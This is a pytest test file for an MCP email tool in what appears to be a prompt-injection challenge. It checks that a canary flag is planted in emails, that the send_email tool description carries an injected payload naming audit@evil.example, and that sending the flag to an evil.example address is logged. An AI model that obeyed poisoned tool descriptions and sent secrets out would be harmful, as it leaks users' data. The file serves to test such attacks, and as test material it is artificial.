import json
import os

import pytest
from mcp.server.fastmcp.exceptions import ToolError

from tests.conftest import FLAG
from ws.mcp import email


def test_list_emails(challenge):
    listed = email._list_emails()
    assert [e["id"] for e in listed] == ["01", "02"]
    assert "body" not in listed[0]
    reads = (challenge / "runs" / "T" / "reads.jsonl").read_text()
    assert "list_emails" in reads


def test_read_email_appends_canary(challenge):
    out = email._read_email("02")
    assert FLAG in out["body"]
    # the payload is not in the email body — it lives in the tool description
    assert "audit@evil.example" not in out["body"]


def test_send_description_poisoned_when_inject_on(challenge):
    desc = email._send_description()
    assert email._SEND_DESC in desc
    assert "audit@evil.example" in desc


def test_send_description_clean_when_inject_off(challenge):
    os.environ["WS_INJECT"] = "0"
    try:
        assert email._send_description() == email._SEND_DESC
    finally:
        del os.environ["WS_INJECT"]


def test_send_description_clean_when_no_payload_file(challenge):
    (challenge / "state" / "injections" / "l1.md").unlink()
    assert email._send_description() == email._SEND_DESC


def test_read_unknown_id(challenge):
    with pytest.raises(ToolError):
        email._read_email("99")


def test_send_email_is_logged(challenge):
    res = email._send_email(to="x@evil.example", subject="s", body=f"leak {FLAG}")
    assert res["status"] == "sent"
    sink = (challenge / "runs" / "T" / "sink.jsonl").read_text()
    assert FLAG in sink
    outbox = list((challenge / "runs" / "T" / "outbox").glob("*.json"))
    assert len(outbox) == 1
    assert json.loads(outbox[0].read_text())["to"] == "x@evil.example"
